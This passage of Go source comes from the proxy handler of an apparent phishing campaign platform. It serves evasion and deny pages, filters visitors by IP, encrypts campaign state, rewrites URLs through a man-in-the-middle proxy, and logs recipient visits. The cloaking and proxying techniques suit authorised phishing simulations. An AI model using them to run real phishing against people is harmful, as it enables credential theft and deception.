				"campaignRecipientID", session.CampaignRecipientID.String(),
				"eventID", eventID.String(),
				"error", err,
			)
		}
	}

	// handle webhook for MITM page visit
	webhookID, err := m.CampaignRepository.GetWebhookIDByCampaignID(ctx, session.CampaignID)
	if err != nil && !errors.Is(err, gorm.ErrRecordNotFound) {
		m.logger.Errorw("failed to get webhook id by campaign id for MITM proxy",
			"campaignID", session.CampaignID.String(),
			"error", err,
		)
	}
	if webhookID != nil && currentPageType != data.PAGE_TYPE_DONE {
		err = m.CampaignService.HandleWebhook(
			ctx,
			webhookID,
			session.CampaignID,
			session.RecipientID,
			eventName,
		)
		if err != nil {
			m.logger.Errorw("failed to handle webhook for MITM page visit",
				"error", err,
				"campaignRecipientID", session.CampaignRecipientID.String(),
			)
		}
	}

	m.logger.Debugw("registered MITM page visit event",
		"campaignRecipientID", session.CampaignRecipientID.String(),
		"pageType", currentPageType,
		"eventName", eventName,
	)
}

// checkAndServeEvasionPage checks if an evasion page should be served and returns the response if so
func (m *ProxyHandler) checkAndServeEvasionPage(req *http.Request, reqCtx *RequestContext) *http.Response {
	// use cached campaign info
	if reqCtx.Campaign == nil {
		return nil
	}
	campaign := reqCtx.Campaign

	// check if there's an evasion page configured
	evasionPageID, err := campaign.EvasionPageID.Get()
	if err != nil {
		return nil
	}

	// check if evasion page is configured for this template
	_, err = campaign.TemplateID.Get()
	if err != nil {
		return nil
	}

	// use cached campaign template
	if reqCtx.CampaignTemplate == nil {
		return nil
	}
	cTemplate := reqCtx.CampaignTemplate

	// check if this is an initial request (no state parameter)
	// we already know we have a campaign recipient ID from reqCtx
	if cTemplate.StateIdentifier != nil {
		stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
		encryptedParam := req.URL.Query().Get(stateParamKey)

		// if there is a state parameter, this is not initial request
		if encryptedParam != "" {
			return nil
		}
	}

	// preserve the original URL without campaign parameters for post-evasion redirect
	originalURL := req.URL.Path
	if req.URL.RawQuery != "" {
		// parse query params and remove campaign recipient ID
		query := req.URL.Query()
		if reqCtx.ParamName != "" {
			query.Del(reqCtx.ParamName)
		}
		if len(query) > 0 {
			originalURL += "?" + query.Encode()
		}
	}

	// this is initial request with campaign recipient ID and no state parameter, serve evasion page
	return m.serveEvasionPageResponseDirect(req, reqCtx, &evasionPageID, campaign, cTemplate, originalURL)
}

// checkAndServeDenyPage checks if a deny page should be served and returns the response if so
func (m *ProxyHandler) checkAndServeDenyPage(req *http.Request, reqCtx *RequestContext) *http.Response {
	// use cached campaign info
	if reqCtx.Campaign == nil {
		return nil
	}
	campaign := reqCtx.Campaign

	// check if campaign has a template
	if _, err := campaign.TemplateID.Get(); err != nil {
		return nil
	}

	// use cached campaign template
	if reqCtx.CampaignTemplate == nil {
		return nil
	}
	cTemplate := reqCtx.CampaignTemplate

	// check if state parameter indicates deny
	stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
	encryptedParam := req.URL.Query().Get(stateParamKey)
	if encryptedParam != "" {
		campaignID, err := campaign.ID.Get()
		if err != nil {
			return nil
		}
		secret := utils.UUIDToSecret(&campaignID)
		if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
			if decrypted == "deny" {
				return m.serveDenyPageResponseDirect(req, reqCtx, campaign, cTemplate)
			}
		}
	}

	return nil
}

func (m *ProxyHandler) serveEvasionPageResponseDirect(req *http.Request, reqCtx *RequestContext, evasionPageID *uuid.UUID, campaign *model.Campaign, cTemplate *model.CampaignTemplate, originalURL string) *http.Response {
	ctx := req.Context()
	evasionPage, err := m.PageRepository.GetByID(ctx, evasionPageID, &repository.PageOption{})
	if err != nil {
		m.logger.Errorw("failed to get evasion page", "error", err, "pageID", evasionPageID)
		return nil
	}

	_, err = campaign.ID.Get()
	if err != nil {
		return nil
	}

	// determine next page type after evasion
	var nextPageType string
	if _, err := cTemplate.BeforeLandingPageID.Get(); err == nil {
		nextPageType = data.PAGE_TYPE_BEFORE
	} else if _, err := cTemplate.BeforeLandingProxyID.Get(); err == nil {
		nextPageType = data.PAGE_TYPE_BEFORE
	} else {
		nextPageType = data.PAGE_TYPE_LANDING
	}

	htmlContent, err := m.renderEvasionPageTemplate(req, reqCtx, evasionPage, campaign, cTemplate, nextPageType, originalURL)
	if err != nil {
		m.logger.Errorw("failed to render evasion page template", "error", err)
		return nil
	}

	// create HTTP response
	resp := &http.Response{
		StatusCode: 200,
		Header:     make(http.Header),
		Body:       io.NopCloser(strings.NewReader(htmlContent)),
	}

	resp.Header.Set("Content-Type", "text/html; charset=utf-8")
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(htmlContent)))
	resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")

	// register evasion page visit event
	m.registerEvasionPageVisitEventDirect(req, reqCtx)

	return resp
}

func (m *ProxyHandler) serveDenyPageResponseDirect(req *http.Request, reqCtx *RequestContext, campaign *model.Campaign, cTemplate *model.CampaignTemplate) *http.Response {
	denyPageID, err := campaign.DenyPageID.Get()
	if err != nil {
		// if no deny page configured, return 403
		resp := &http.Response{
			StatusCode: 403,
			Header:     make(http.Header),
			Body:       io.NopCloser(strings.NewReader("Access denied")),
		}
		resp.Header.Set("Content-Type", "text/plain")
		resp.Header.Set("Content-Length", "13")
		return resp
	}

	// check if we're on a mitm domain and should redirect to campaign template domain
	if cTemplate != nil && cTemplate.Domain != nil {
		currentDomainName := req.Host
		templateDomainName, err := cTemplate.Domain.Name.Get()
		if err == nil && currentDomainName != templateDomainName.String() {
			// we're on mitm domain, redirect to campaign template domain
			campaignID := campaign.ID.MustGet()
			redirectURL := m.buildCampaignFlowRedirectURL(&ProxySession{
				CampaignRecipientID: reqCtx.CampaignRecipientID,
				Campaign:            campaign,
				CampaignID:          &campaignID,
			}, "deny")
			if redirectURL != "" {
				resp := &http.Response{
					StatusCode: 302,
					Header:     make(http.Header),
					Body:       io.NopCloser(strings.NewReader("")),
				}
				resp.Header.Set("Location", redirectURL)
				resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				return resp
			}
		}
	}

	// serve deny page directly (either on campaign template domain or as fallback)
	ctx := req.Context()
	denyPage, err := m.PageRepository.GetByID(ctx, &denyPageID, &repository.PageOption{})
	if err != nil {
		m.logger.Errorw("failed to get deny page", "error", err, "pageID", denyPageID)
		return nil
	}

	// render deny page with full template processing
	htmlContent, err := m.renderDenyPageTemplate(req, reqCtx, denyPage, campaign, cTemplate)
	if err != nil {
		m.logger.Errorw("failed to render deny page template", "error", err)
		return nil
	}

	// create HTTP response
	resp := &http.Response{
		StatusCode: 200,
		Header:     make(http.Header),
		Body:       io.NopCloser(strings.NewReader(htmlContent)),
	}

	resp.Header.Set("Content-Type", "text/html; charset=utf-8")
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(htmlContent)))
	resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")

	return resp
}

// renderDenyPageTemplate renders the deny page with full template processing like evasion pages
func (m *ProxyHandler) renderDenyPageTemplate(req *http.Request, reqCtx *RequestContext, page *model.Page, campaign *model.Campaign, cTemplate *model.CampaignTemplate) (string, error) {
	// use cached recipient data
	cRecipient := reqCtx.CampaignRecipient
	recipientID := reqCtx.RecipientID
	if cRecipient == nil || recipientID == nil {
		ctx := req.Context()
		var err error
		cRecipient, err = m.CampaignRecipientRepository.GetByID(ctx, reqCtx.CampaignRecipientID, &repository.CampaignRecipientOption{})
		if err != nil {
			return "", fmt.Errorf("failed to get campaign recipient: %w", err)
		}
		rid, err := cRecipient.RecipientID.Get()
		if err != nil {
			return "", fmt.Errorf("failed to get recipient ID: %w", err)
		}
		recipientID = &rid
	}

	// get recipient details
	ctx := req.Context()
	recipientRepo := repository.Recipient{DB: m.CampaignRecipientRepository.DB}
	recipient, err := recipientRepo.GetByID(ctx, recipientID, &repository.RecipientOption{})
	if err != nil {
		return "", fmt.Errorf("failed to get recipient: %w", err)
	}

	// get email for template
	templateID, err := campaign.TemplateID.Get()
	if err != nil {
		return "", fmt.Errorf("failed to get template ID: %w", err)
	}

	// use cached template (should already have WithEmail: true from context initialization)
	cTemplateWithEmail := reqCtx.CampaignTemplate
	if cTemplateWithEmail == nil {
		cTemplateWithEmail, err = m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
			WithEmail: true,
		})
		if err != nil {
			return "", fmt.Errorf("failed to get campaign template with email: %w", err)
		}
	}

	emailID := cTemplateWithEmail.EmailID.MustGet()
	emailRepo := repository.Email{DB: m.CampaignRepository.DB}
	email, err := emailRepo.GetByID(ctx, &emailID, &repository.EmailOption{})
	if err != nil {
		return "", fmt.Errorf("failed to get email: %w", err)
	}

	// get domain
	hostVO, err := vo.NewString255(req.Host)
	if err != nil {
		return "", fmt.Errorf("failed to create host VO: %w", err)
	}
	domain, err := m.DomainRepository.GetByName(ctx, hostVO, &repository.DomainOption{})
	if err != nil {
		return "", fmt.Errorf("failed to get domain: %w", err)
	}

	// get page content
	htmlContent, err := page.Content.Get()
	if err != nil {
		return "", fmt.Errorf("failed to get deny page HTML content: %w", err)
	}

	// convert model.Domain to database.Domain
	var proxyID *uuid.UUID
	if id, err := domain.ProxyID.Get(); err == nil {
		proxyID = &id
	}

	dbDomain := &database.Domain{
		ID:                domain.ID.MustGet(),
		Name:              domain.Name.MustGet().String(),
		Type:              domain.Type.MustGet().String(),
		ProxyID:           proxyID,
		ProxyTargetDomain: domain.ProxyTargetDomain.MustGet().String(),
		HostWebsite:       domain.HostWebsite.MustGet(),
		RedirectURL:       domain.RedirectURL.MustGet().String(),
	}

	// use template service to render the deny page with full template processing
	buf, err := m.TemplateService.CreatePhishingPageWithCampaign(
		dbDomain,
		email,
		reqCtx.CampaignRecipientID,
		recipient,
		htmlContent.String(),
		cTemplate,
		"", // no state parameter for deny pages
		req.URL.Path,
		campaign,
	)
	if err != nil {
		return "", fmt.Errorf("failed to render deny page template: %w", err)
	}

	return buf.String(), nil
}

func (m *ProxyHandler) renderEvasionPageTemplate(req *http.Request, reqCtx *RequestContext, page *model.Page, campaign *model.Campaign, cTemplate *model.CampaignTemplate, nextPageType string, originalURL string) (string, error) {
	// use cached recipient data
	cRecipient := reqCtx.CampaignRecipient
	recipientID := reqCtx.RecipientID
	if cRecipient == nil || recipientID == nil {
		ctx := req.Context()
		var err error
		cRecipient, err = m.CampaignRecipientRepository.GetByID(ctx, reqCtx.CampaignRecipientID, &repository.CampaignRecipientOption{})
		if err != nil {
			return "", fmt.Errorf("failed to get campaign recipient: %w", err)
		}
		rid, err := cRecipient.RecipientID.Get()
		if err != nil {
			return "", fmt.Errorf("failed to get recipient ID: %w", err)
		}
		recipientID = &rid
	}

	// get recipient details
	ctx := req.Context()
	recipientRepo := repository.Recipient{DB: m.CampaignRecipientRepository.DB}
	recipient, err := recipientRepo.GetByID(ctx, recipientID, &repository.RecipientOption{})
	if err != nil {
		return "", fmt.Errorf("failed to get recipient: %w", err)
	}

	// get email for template
	templateID, err := campaign.TemplateID.Get()
	if err != nil {
		return "", fmt.Errorf("failed to get template ID: %w", err)
	}

	// use cached template (should already have WithEmail: true from context initialization)
	cTemplateWithEmail := reqCtx.CampaignTemplate
	if cTemplateWithEmail == nil {
		cTemplateWithEmail, err = m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
			WithEmail: true,
		})
		if err != nil {
			return "", fmt.Errorf("failed to get campaign template with email: %w", err)
		}
	}

	emailID := cTemplateWithEmail.EmailID.MustGet()
	emailRepo := repository.Email{DB: m.CampaignRepository.DB}
	email, err := emailRepo.GetByID(ctx, &emailID, &repository.EmailOption{})
	if err != nil {
		return "", fmt.Errorf("failed to get email: %w", err)
	}

	// get domain
	hostVO, err := vo.NewString255(req.Host)
	if err != nil {
		return "", fmt.Errorf("failed to create host VO: %w", err)
	}
	domain, err := m.DomainRepository.GetByName(ctx, hostVO, &repository.DomainOption{})
	if err != nil {
		return "", fmt.Errorf("failed to get domain: %w", err)
	}

	// create encrypted state parameter for next page
	campaignID := campaign.ID.MustGet()
	encryptedNextState, err := utils.Encrypt(nextPageType, utils.UUIDToSecret(&campaignID))
	if err != nil {
		return "", fmt.Errorf("failed to encrypt next state: %w", err)
	}

	// get page content
	htmlContent, err := page.Content.Get()
	if err != nil {
		return "", fmt.Errorf("failed to get evasion page HTML content: %w", err)
	}

	// convert model.Domain to database.Domain
	var proxyID *uuid.UUID
	if id, err := domain.ProxyID.Get(); err == nil {
		proxyID = &id
	}

	dbDomain := &database.Domain{
		ID:                domain.ID.MustGet(),
		Name:              domain.Name.MustGet().String(),
		Type:              domain.Type.MustGet().String(),
		ProxyID:           proxyID,
		ProxyTargetDomain: domain.ProxyTargetDomain.MustGet().String(),
		HostWebsite:       domain.HostWebsite.MustGet(),
		RedirectURL:       domain.RedirectURL.MustGet().String(),
	}

	// use template service to render the page with preserved original URL
	buf, err := m.TemplateService.CreatePhishingPageWithCampaign(
		dbDomain,
		email,
		reqCtx.CampaignRecipientID,
		recipient,
		htmlContent.String(),
		cTemplate,
		encryptedNextState,
		originalURL,
		campaign,
	)
	if err != nil {
		return "", fmt.Errorf("failed to render evasion page template: %w", err)
	}

	return buf.String(), nil
}

func (m *ProxyHandler) registerEvasionPageVisitEventDirect(req *http.Request, reqCtx *RequestContext) {
	// use cached recipient data
	if reqCtx.CampaignRecipient == nil || reqCtx.RecipientID == nil || reqCtx.CampaignID == nil || reqCtx.Campaign == nil {
		return
	}

	recipientID := reqCtx.RecipientID
	campaignID := reqCtx.CampaignID
	campaign := reqCtx.Campaign

	eventID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_EVASION_PAGE_VISITED]
	newEventID := uuid.New()
	clientIP := vo.NewOptionalString64Must(utils.ExtractClientIP(req))
	userAgent := vo.NewOptionalString255Must(utils.Substring(req.UserAgent(), 0, 1000)) // MAX_USER_AGENT_SAVED equivalent

	var event *model.CampaignEvent
	if !campaign.IsAnonymous.MustGet() {
		event = &model.CampaignEvent{
			ID:          &newEventID,
			CampaignID:  campaignID,
			RecipientID: recipientID,
			IP:          clientIP,
			UserAgent:   userAgent,
			EventID:     eventID,
			Data:        vo.NewEmptyOptionalString1MB(),
		}
	} else {
		ua := vo.NewEmptyOptionalString255()
		event = &model.CampaignEvent{
			ID:          &newEventID,
			CampaignID:  campaignID,
			RecipientID: nil,
			IP:          vo.NewEmptyOptionalString64(),
			UserAgent:   ua,
			EventID:     eventID,
			Data:        vo.NewEmptyOptionalString1MB(),
		}
	}

	err := m.CampaignRepository.SaveEvent(req.Context(), event)
	if err != nil {
		m.logger.Errorw("failed to save evasion page visit event", "error", err)
	}
}

// checkIPFilter checks if the IP is allowed for proxy requests
// returns (blocked, response) where blocked=true means the IP should be blocked
func (m *ProxyHandler) checkIPFilter(req *http.Request, reqCtx *RequestContext) (bool, *http.Response) {
	// use cached campaign info
	if reqCtx.Campaign == nil || reqCtx.CampaignID == nil {
		return false, nil // allow if we can't get campaign info
	}
	campaign := reqCtx.Campaign
	campaignID := reqCtx.CampaignID

	// extract client IP and strip port if present using net.SplitHostPort for IPv6 safety
	ip := utils.ExtractClientIP(req)
	if host, _, err := net.SplitHostPort(ip); err == nil {
		ip = host
	}

	// get allow/deny list entries
	allowDenyEntries, err := m.CampaignRepository.GetAllDenyByCampaignID(req.Context(), campaignID)
	if err != nil && err != gorm.ErrRecordNotFound {
		return false, nil // allow if we can't get the list
	}

	// if there are no entries, allow access
	if len(allowDenyEntries) == 0 {
		return false, nil
	}

	// check IP against allow/deny lists
	isAllowListing := false
	allowed := false // for allow lists, default is deny

	for i, allowDeny := range allowDenyEntries {
		if i == 0 {
			isAllowListing = allowDeny.Allowed.MustGet()
			if !isAllowListing {
				// if deny listing, then by default the IP is allowed until proven otherwise
				allowed = true
			}
		}

		ok, err := allowDeny.IsIPAllowed(ip)
		if err != nil {
			continue
		}

		if isAllowListing && ok {
			allowed = true
			break
		} else if !isAllowListing && !ok {
			allowed = false
			break
		}
	}

	if !allowed {
		// try to serve deny page
		if _, err := campaign.DenyPageID.Get(); err == nil {
			resp := m.serveDenyPageResponseDirect(req, reqCtx, campaign, nil)
			return true, resp
		}

		// if no deny page, block with 404
		return true, nil
	}

	return false, nil
}

// checkAndApplyURLRewrite checks if the incoming request matches any URL rewrite rules
// and returns a redirect response if a match is found
func (m *ProxyHandler) checkAndApplyURLRewrite(req *http.Request, reqCtx *RequestContext) *http.Response {
	// check if this is already a rewritten URL that we need to reverse map
	originalURL := m.getReverseURLMapping(req.URL.Path, req.URL.RawQuery)
	if originalURL != "" {
		// this is a rewritten URL, update the request to use the original URL
		m.applyReverseURLMapping(req, originalURL)
		return nil
	}

	// check for URL rewrite rules in domain config
	var rewriteRules []service.ProxyServiceURLRewriteRule
	if domainConfig, exists := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; exists && domainConfig.RewriteURLs != nil {
		rewriteRules = append(rewriteRules, domainConfig.RewriteURLs...)
	}

	// check for URL rewrite rules in global config
	if reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.RewriteURLs != nil {
		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
	}

	// check each rewrite rule
	for _, rule := range rewriteRules {
		if matched, rewrittenURL := m.applyURLRewriteRule(req, rule); matched {
			// store the mapping for reverse lookup
			originalURL := req.URL.Path
			if req.URL.RawQuery != "" {
				originalURL += "?" + req.URL.RawQuery
			}
			m.storeURLMapping(rewrittenURL, originalURL)

			// create redirect response
			return &http.Response{
				StatusCode: http.StatusFound,
				Header: http.Header{
					"Location": []string{rewrittenURL},
				},
				Body: io.NopCloser(strings.NewReader("")),
			}
		}
	}

	return nil
}

// applyURLRewriteRule checks if a URL matches a rewrite rule and returns the rewritten URL
func (m *ProxyHandler) applyURLRewriteRule(req *http.Request, rule service.ProxyServiceURLRewriteRule) (bool, string) {
	// compile regex pattern
	pathRegex, err := regexp.Compile(rule.Find)
	if err != nil {
		m.logger.Errorw("invalid URL rewrite regex pattern", "pattern", rule.Find, "error", err)
		return false, ""
	}

	// check if path matches
	if !pathRegex.MatchString(req.URL.Path) {
		return false, ""
	}

	// build rewritten URL
	rewrittenPath := rule.Replace
	rewrittenQuery := m.rewriteQueryParameters(req.URL.Query(), rule.Query, rule.Filter)

	// construct full rewritten URL
	rewrittenURL := rewrittenPath
	if rewrittenQuery != "" {
		rewrittenURL += "?" + rewrittenQuery
	}

	return true, rewrittenURL
}

// rewriteQueryParameters applies query parameter mapping rules
func (m *ProxyHandler) rewriteQueryParameters(originalQuery url.Values, queryRules []service.ProxyServiceURLRewriteQueryParam, filter []string) string {
	rewrittenQuery := url.Values{}

	// if filter list is empty, keep all parameters and apply mappings
	if len(filter) == 0 {
		// start with all original parameters
		for key, values := range originalQuery {
			rewrittenQuery[key] = values
		}

		// apply parameter mappings
		for _, rule := range queryRules {
			if values, exists := originalQuery[rule.Find]; exists {
				// remove the old key and add the new one
				delete(rewrittenQuery, rule.Find)
				rewrittenQuery[rule.Replace] = values
			}
		}
	} else {
		// only keep parameters in the filter list
		for _, key := range filter {
			if values, exists := originalQuery[key]; exists {
				rewrittenQuery[key] = values
			}
		}

		// apply mappings only to filtered parameters
		for _, rule := range queryRules {
			if values, exists := originalQuery[rule.Find]; exists && contains(filter, rule.Find) {
				// remove the old key and add the new one
				delete(rewrittenQuery, rule.Find)
				rewrittenQuery[rule.Replace] = values
			}
		}
	}

	return rewrittenQuery.Encode()
}

// contains checks if a string slice contains a specific string
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// storeURLMapping stores the mapping between rewritten and original URLs
func (m *ProxyHandler) storeURLMapping(rewrittenURL, originalURL string) {
	m.urlMappings.Store(rewrittenURL, originalURL)
}

// getReverseURLMapping gets the original URL for a rewritten URL
func (m *ProxyHandler) getReverseURLMapping(path, query string) string {
	rewrittenURL := path
	if query != "" {
		rewrittenURL += "?" + query
	}

	if originalURL, exists := m.urlMappings.Load(rewrittenURL); exists {
		return originalURL.(string)
	}
	return ""
}

// applyReverseURLMapping updates the request to use the original URL
func (m *ProxyHandler) applyReverseURLMapping(req *http.Request, originalURL string) {
	// parse the original URL
	parsedURL, err := url.Parse(originalURL)
	if err != nil {
		m.logger.Errorw("failed to parse original URL during reverse mapping", "url", originalURL, "error", err)
		return
	}

	// update request URL
	req.URL.Path = parsedURL.Path
	req.URL.RawQuery = parsedURL.RawQuery
	req.RequestURI = req.URL.Path
	if req.URL.RawQuery != "" {
		req.RequestURI += "?" + req.URL.RawQuery
	}
}

// applyURLPathRewrites applies URL path rewriting to response body content
func (m *ProxyHandler) applyURLPathRewrites(body []byte, reqCtx *RequestContext) []byte {
	// get URL rewrite rules from domain config
	var rewriteRules []service.ProxyServiceURLRewriteRule
	if domainConfig, exists := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; exists && domainConfig.RewriteURLs != nil {
		rewriteRules = append(rewriteRules, domainConfig.RewriteURLs...)
	}

	// get URL rewrite rules from global config
	if reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.RewriteURLs != nil {
		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
	}

	// apply each rewrite rule to the response body
	bodyStr := string(body)
	for _, rule := range rewriteRules {
		bodyStr = m.rewritePathsInContent(bodyStr, rule)
	}

	return []byte(bodyStr)
}

// applyURLPathRewritesWithoutSession applies URL path rewriting for requests without session
func (m *ProxyHandler) applyURLPathRewritesWithoutSession(body []byte, reqCtx *RequestContext) []byte {
	return m.applyURLPathRewrites(body, reqCtx)
}

// rewritePathsInContent rewrites URL paths in HTML/JS content according to rewrite rules
func (m *ProxyHandler) rewritePathsInContent(content string, rule service.ProxyServiceURLRewriteRule) string {
	// compile regex pattern for finding URLs in content
	pathRegex, err := regexp.Compile(rule.Find)
	if err != nil {
		m.logger.Errorw("invalid URL rewrite regex pattern", "pattern", rule.Find, "error", err)
		return content
	}

	// find and replace all occurrences of the original path with the rewritten path
	return pathRegex.ReplaceAllString(content, rule.Replace)
}

// getHostConfig is a helper function to safely load and cast host configuration
func (m *ProxyHandler) getHostConfig(session *ProxySession, host string) (service.ProxyServiceDomainConfig, bool) {
	hostConfigInterface, exists := session.Config.Load(host)
	if !exists {
		return service.ProxyServiceDomainConfig{}, false
	}
	return hostConfigInterface.(service.ProxyServiceDomainConfig), true
}
